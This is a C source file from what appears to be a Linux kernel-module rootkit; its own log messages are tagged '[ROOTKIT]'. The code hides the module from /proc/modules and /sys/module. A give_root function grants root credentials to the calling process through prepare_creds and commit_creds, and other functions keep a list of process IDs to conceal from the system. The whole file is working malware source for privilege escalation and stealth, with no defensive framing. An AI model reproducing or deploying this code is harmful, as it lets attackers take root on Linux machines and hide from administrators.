#include "utils.h"

#include "constants.h"
#include "macro_utils.h"
#include <asm/current.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/printk.h>
#include <linux/types.h>

LIST_HEAD(hidden_pids_list);

void hide_module(void)
{
    // Remove module from /proc/modules
    list_del(&THIS_MODULE->list);

    // Remove module from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);

    pr_info("[ROOTKIT] Module was hidden from /proc/modules and /sys/module/\n");
}

void show_all_processes(void)
{
    hidden_pid_t *p_hidden_pid = NULL; // Hidden PID structure
    hidden_pid_t *p_tmp        = NULL; // Temporary pointer for iteration

    pr_info("[ROOTKIT] Unhiding all processes...\n");

    // Remove all PIDs from the hidden list
    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
        list_del(&p_hidden_pid->list);
        kfree(p_hidden_pid);
    }
}

bool is_pid_hidden(const pid_t i32_pid)
{
    const hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
    const pid_t i32_real_pid         = get_effective_pid(i32_pid); // Effective PID to check

    if (i32_real_pid == -1) {
        return false;
    }

    // Check if the given PID is in the hidden list
    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
                p_hidden_pid->i32_pid, i32_real_pid);
        if (p_hidden_pid->i32_pid == i32_real_pid) {
            pr_cont(" found!\n");
            return true;
        }
        else {
            pr_cont(" not found\n");
        }
    }

    return false;
}

long give_root(const pid_t i32_pid, const int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_err("[ROOTKIT] * Failed to get credentials\n");
        return -EPERM;
    }

    __SET_UIDS(p_creds, ROOT_UID);
    __SET_GIDS(p_creds, ROOT_GID);

    commit_creds(p_creds);

    pr_info("[ROOTKIT] * Process is now root\n");

    return 0;
}

long hide_process(const pid_t i32_pid, const int i32_sig)
{
    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show

    if (i32_real_pid == -1) {
        return -EPERM;
    }

    pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);

    p_hidden_pid = kzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
    IF_U (p_hidden_pid == NULL) {
        pr_err("[ROOTKIT]   * Failed to allocate memory for hidden PID structure\n");
        return -EPERM;
    }

    // Add the given PID to the list (if it is 0, add the current PID)
    p_hidden_pid->i32_pid = i32_real_pid;

    list_add(&p_hidden_pid->list, &hidden_pids_list);

    return 0;
}

long show_process(const pid_t i32_pid, const int i32_sig)
{
    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
    hidden_pid_t *p_tmp        = NULL;                       // Temporary pointer for iteration
    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show

    if (i32_real_pid == -1) {
        return -EPERM;
    }

    pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);

    // Remove the given PID from the hidden list (if it is 0, remove the current PID)
    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
        if (p_hidden_pid->i32_pid == i32_real_pid) {
            list_del(&p_hidden_pid->list);
            kfree(p_hidden_pid);
        }
    }

    return 0;
}
